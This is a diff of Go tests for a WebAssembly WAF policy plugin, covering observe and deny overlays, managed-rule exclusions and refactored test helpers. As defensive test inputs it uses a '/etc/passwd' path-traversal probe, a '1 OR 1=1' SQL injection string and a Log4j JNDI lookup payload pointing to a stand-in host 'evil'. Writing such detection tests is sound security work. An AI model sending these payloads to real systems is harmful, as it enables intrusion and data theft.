@@ -48,6 +48,50 @@ func TestWAFArtifactInitEvaluateConfigAndBodyWindowBoundaries(t *testing.T) {
 	}
 }
 
+func TestWAFDefaultObserveOverlayAndExpandedManagedRules(t *testing.T) {
+	artifact := buildWAFArtifact(t)
+	if status, action := runWAFArtifact(t, artifact, []byte(`{}`), "/etc/passwd", nil, true); status != pluginsdk.PolicyStatusOK || action != pluginsdk.PolicyActionObserve {
+		t.Fatalf("default observe /etc/passwd = status %d action %d", status, action)
+	}
+	if status, action := runWAFArtifact(t, artifact, []byte(`{}`), "/safe", nil, true); status != pluginsdk.PolicyStatusOK || action != pluginsdk.PolicyActionAllow {
+		t.Fatalf("default observe benign = status %d action %d", status, action)
+	}
+	if status, action := runWAFArtifactWith(t, artifact, wafArtifactOptions{
+		config: []byte(`{}`), path: "/etc/passwd", complete: true, overlay: []byte(`{"mode":"deny"}`),
+	}); status != pluginsdk.PolicyStatusOK || action != pluginsdk.PolicyActionDeny {
+		t.Fatalf("deny overlay = status %d action %d", status, action)
+	}
+	if status, action := runWAFArtifactWith(t, artifact, wafArtifactOptions{
+		config: []byte(`{"mode":"deny"}`), path: "/etc/passwd", complete: true, overlay: []byte(`{"mode":"observe"}`),
+	}); status != pluginsdk.PolicyStatusOK || action != pluginsdk.PolicyActionObserve {
+		t.Fatalf("observe overlay = status %d action %d", status, action)
+	}
+	if status, action := runWAFArtifactWith(t, artifact, wafArtifactOptions{
+		config: []byte(`{}`), path: "/", query: "q=1 OR 1=1", complete: true,
+	}); status != pluginsdk.PolicyStatusOK || action != pluginsdk.PolicyActionObserve {
+		t.Fatalf("expanded sqli observe = status %d action %d", status, action)
+	}
+	if status, action := runWAFArtifactWith(t, artifact, wafArtifactOptions{
+		config:   []byte(`{}`),
+		path:     "/",
+		headers:  []byte("${jndi:ldap://evil}"),
+		complete: true,
+	}); status != pluginsdk.PolicyStatusOK || action != pluginsdk.PolicyActionObserve {
+		t.Fatalf("expanded log4j observe = status %d action %d", status, action)
+	}
+
+	session, status := startWAFArtifact(t, artifact, wafArtifactOptions{
+		config: []byte(`{}`), path: "/etc/passwd", complete: true, overlay: []byte(`{"mode":"block"}`),
+	})
+	defer session.Close()
+	if status != pluginsdk.PolicyStatusOK {
+		t.Fatalf("invalid overlay init status = %d", status)
+	}
+	if !session.EvaluateHasError() {
+		t.Fatal("invalid overlay evaluate succeeded")
+	}
+}
+
 func TestWAFArtifactResetPreservesInitializedGenerationConfig(t *testing.T) {
 	artifact := buildWAFArtifact(t)
 	observeWithCustomRule := []byte(`{"mode":"observe","custom_rules":[{"id":"reset-probe","target":"path","needle":"reset-probe"}]}`)
@@ -129,7 +173,7 @@ func TestWAFArtifactHostCallsAreDemandDriven(t *testing.T) {
 	})
 
 	t.Run("body rule excluded", func(t *testing.T) {
-		config := []byte(`{"mode":"deny","exclusions":[{"rule_id":"managed-xss-script","path_prefix":"/"}]}`)
+		config := []byte(`{"mode":"deny","exclusions":[{"rule_id":"managed-xss-script","path_prefix":"/"},{"rule_id":"managed-xss-iframe","path_prefix":"/"},{"rule_id":"managed-xss-svg","path_prefix":"/"},{"rule_id":"managed-sqli-union-body","path_prefix":"/"}]}`)
 		session, status := initPolicyArtifact(t, artifact, config, "/safe", nil, true)
 		defer session.Close()
 		if status != pluginsdk.PolicyStatusOK || session.Evaluate() != pluginsdk.PolicyActionAllow {
@@ -144,6 +188,16 @@ func TestWAFArtifactHostCallsAreDemandDriven(t *testing.T) {
 	})
 }
 
+type wafArtifactOptions struct {
+	config   []byte
+	path     string
+	query    string
+	headers  []byte
+	body     []byte
+	complete bool
+	overlay  []byte
+}
+
 type policyArtifactSession struct {
 	t              *testing.T
 	ctx            context.Context
@@ -156,11 +210,17 @@ type policyArtifactSession struct {
 	fieldCalls     map[string]int
 	lastPayload    []byte
 	normalizedHTTP []byte
+	overlay        []byte
 }
 
 func runWAFArtifact(t *testing.T, artifact, config []byte, path string, body []byte, complete bool) (pluginsdk.PolicyStatus, pluginsdk.PolicyAction) {
 	t.Helper()
-	session, status := initPolicyArtifact(t, artifact, config, path, body, complete)
+	return runWAFArtifactWith(t, artifact, wafArtifactOptions{config: config, path: path, body: body, complete: complete})
+}
+
+func runWAFArtifactWith(t *testing.T, artifact []byte, options wafArtifactOptions) (pluginsdk.PolicyStatus, pluginsdk.PolicyAction) {
+	t.Helper()
+	session, status := startWAFArtifact(t, artifact, options)
 	defer session.Close()
 	if status != pluginsdk.PolicyStatusOK {
 		return status, pluginsdk.PolicyActionUnspecified
@@ -170,15 +230,25 @@ func runWAFArtifact(t *testing.T, artifact, config []byte, path string, body []b
 
 func initPolicyArtifact(t *testing.T, artifact, config []byte, path string, body []byte, complete bool) (*policyArtifactSession, pluginsdk.PolicyStatus) {
 	t.Helper()
+	return startWAFArtifact(t, artifact, wafArtifactOptions{config: config, path: path, body: body, complete: complete})
+}
+
+func startWAFArtifact(t *testing.T, artifact []byte, options wafArtifactOptions) (*policyArtifactSession, pluginsdk.PolicyStatus) {
+	t.Helper()
 	ctx := context.Background()
 	runtime := wazero.NewRuntimeWithConfig(ctx, wazero.NewRuntimeConfig().WithCoreFeatures(api.CoreFeaturesV2))
-	session := &policyArtifactSession{t: t, ctx: ctx, runtime: runtime, hostCalls: make(map[string]int), fieldCalls: make(map[string]int)}
+	session := &policyArtifactSession{t: t, ctx: ctx, runtime: runtime, hostCalls: make(map[string]int), fieldCalls: make(map[string]int), overlay: options.overlay}
+	headers := options.headers
+	if headers == nil {
+		headers = []byte("content-type: application/octet-stream")
+	}
+	path, body, complete := options.path, options.body, options.complete
 	fields := map[string][]byte{
 		"site":                         []byte("site-a"),
 		"method":                       []byte("POST"),
 		"path":                         []byte(path),
-		"query":                        nil,
-		"headers":                      []byte("content-type: application/octet-stream"),
+		"query":                        []byte(options.query),
+		"headers":                      headers,
 		"trusted_source":               []byte("192.0.2.10"),
 		"trusted_source_authenticated": []byte("true"),
 		"body_window_complete":         []byte(map[bool]string{true: "true", false: "false"}[complete]),
@@ -205,7 +275,7 @@ func initPolicyArtifact(t *testing.T, artifact, config []byte, path string, body
 				value, found := fields[field]
 				response, err = marshalWAFBytesResponse(value, found)
 			case pluginsdk.PolicyHostReadNormalizedHTTP:
-				response, err = marshalWAFNormalizedHTTPResponse(path, fields["headers"], fields["trusted_source"], len(body), complete)
+				response, err = marshalWAFNormalizedHTTPResponse(path, options.query, fields["headers"], fields["trusted_source"], len(body), complete)
 			case pluginsdk.PolicyHostReadBodyWindow:
 				message := decodeWAFPolicyMessage(t, "ReadBodyWindowRequest", request)
 				limit := int(wafMessageUint(t, message, "length"))
@@ -251,12 +321,12 @@ func initPolicyArtifact(t *testing.T, artifact, config []byte, path string, body
 	}
 	session.guest = guest
 	session.normalizedHTTP, err = marshalWAFNormalizedHTTPResponse(
-		path, fields["headers"], fields["trusted_source"], len(body), complete,
+		path, options.query, fields["headers"], fields["trusted_source"], len(body), complete,
 	)
 	if err != nil {
 		t.Fatal(err)
 	}
-	initWire := marshalWAFInit(t, config)
+	initWire := marshalWAFInit(t, options.config)
 	initPointer := wafAllocateAndWrite(t, ctx, guest, initWire)
 	result, err := guest.ExportedFunction(pluginsdk.PolicyExportInit).Call(ctx, uint64(initPointer), uint64(len(initWire)))
 	if err != nil || len(result) != 1 {
@@ -281,21 +351,15 @@ func (session *policyArtifactSession) EvaluateWithImportFallback() pluginsdk.Pol
 	return session.evaluate(nil)
 }
 
+func (session *policyArtifactSession) EvaluateHasError() bool {
+	session.t.Helper()
+	message := session.evaluateResponse(session.normalizedHTTP)
+	return message.ProtoReflect().Has(wafField(session.t, message, "error"))
+}
+
 func (session *policyArtifactSession) evaluate(normalizedHTTP []byte) pluginsdk.PolicyAction {
 	session.t.Helper()
-	session.evaluateCount++
-	evaluateWire := marshalWAFEvaluate(session.t, normalizedHTTP)
-	evaluatePointer := wafAllocateAndWrite(session.t, session.ctx, session.guest, evaluateWire)
-	result, err := session.guest.ExportedFunction(pluginsdk.PolicyExportEvaluate).Call(session.ctx, uint64(evaluatePointer), uint64(len(evaluateWire)))
-	if err != nil || len(result) != 1 {
-		session.t.Fatalf("evaluate call = %v, %v", result, err)
-	}
-	outputPointer, outputLength := pluginsdk.UnpackPolicyBuffer(result[0])
-	output, ok := session.guest.Memory().Read(outputPointer, outputLength)
-	if !ok {
-		session.t.Fatal("evaluate returned invalid output range")
-	}
-	message := decodeWAFPolicyMessage(session.t, "EvaluateResponse", output)
+	message := session.evaluateResponse(normalizedHTTP)
 	successField := wafField(session.t, message, "success")
 	if !message.ProtoReflect().Has(successField) {
 		session.t.Fatalf("evaluate response has no success: %v", message)
@@ -311,6 +375,23 @@ func (session *policyArtifactSession) evaluate(normalizedHTTP []byte) pluginsdk.
 	}
 	session.lastPayload = append(session.lastPayload[:0], success.Get(payloadField).Bytes()...)
 	return pluginsdk.PolicyAction(success.Get(actionField).Enum())
+}
+
+func (session *policyArtifactSession) evaluateResponse(normalizedHTTP []byte) *dynamicpb.Message {
+	session.t.Helper()
+	session.evaluateCount++
+	evaluateWire := marshalWAFEvaluate(session.t, normalizedHTTP, session.overlay)
+	evaluatePointer := wafAllocateAndWrite(session.t, session.ctx, session.guest, evaluateWire)
+	result, err := session.guest.ExportedFunction(pluginsdk.PolicyExportEvaluate).Call(session.ctx, uint64(evaluatePointer), uint64(len(evaluateWire)))
+	if err != nil || len(result) != 1 {
+		session.t.Fatalf("evaluate call = %v, %v", result, err)
+	}
+	outputPointer, outputLength := pluginsdk.UnpackPolicyBuffer(result[0])
+	output, ok := session.guest.Memory().Read(outputPointer, outputLength)
+	if !ok {
+		session.t.Fatal("evaluate returned invalid output range")
+	}
+	return decodeWAFPolicyMessage(session.t, "EvaluateResponse", output)
 }
 
 func (session *policyArtifactSession) HostCalls(name string) int {
@@ -351,7 +432,7 @@ func marshalWAFInit(t *testing.T, config []byte) []byte {
 	return marshalWAFMessage(t, message)
 }
 
-func marshalWAFEvaluate(t *testing.T, normalizedHTTP []byte) []byte {
+func marshalWAFEvaluate(t *testing.T, normalizedHTTP, overlay []byte) []byte {
 	message := newWAFPolicyMessage(t, "EvaluateRequest")
 	message.ProtoReflect().Set(wafField(t, message, "extension_point"), protoreflect.ValueOfString("http.request"))
 	message.ProtoReflect().Set(wafField(t, message, "request_id"), protoreflect.ValueOfString("waf-request-1"))
@@ -360,6 +441,9 @@ func marshalWAFEvaluate(t *testing.T, normalizedHTTP []byte) []byte {
 			wafField(t, message, "normalized_http"),
 			protoreflect.ValueOfBytes(normalizedHTTP),
 		)
+	}
+	if len(overlay) != 0 {
+		message.ProtoReflect().Set(wafField(t, message, "payload"), protoreflect.ValueOfBytes(overlay))
 	}
 	return marshalWAFMessage(t, message)
 }
@@ -375,13 +459,16 @@ func marshalWAFBytesResponse(value []byte, found bool) ([]byte, error) {
 	return (proto.MarshalOptions{Deterministic: true}).Marshal(message)
 }
 
-func marshalWAFNormalizedHTTPResponse(path string, headers, source []byte, bodyLength int, complete bool) ([]byte, error) {
+func marshalWAFNormalizedHTTPResponse(path, query string, headers, source []byte, bodyLength int, complete bool) ([]byte, error) {
 	descriptor, err := protoschema.Message("nre.plugin.policy.v1.NormalizedHTTPResponse")
 	if err != nil {
 		return nil, err
 	}
 	message := dynamicpb.NewMessage(descriptor)
 	message.Set(descriptor.Fields().ByName("path"), protoreflect.ValueOfBytes([]byte(path)))
+	if query != "" {
+		message.Set(descriptor.Fields().ByName("query"), protoreflect.ValueOfBytes([]byte(query)))
+	}
 	message.Set(descriptor.Fields().ByName("headers"), protoreflect.ValueOfBytes(headers))
 	message.Set(descriptor.Fields().ByName("trusted_source"), protoreflect.ValueOfBytes(source))
 	message.Set(descriptor.Fields().ByName("trusted_source_authenticated"), protoreflect.ValueOfBool(true))
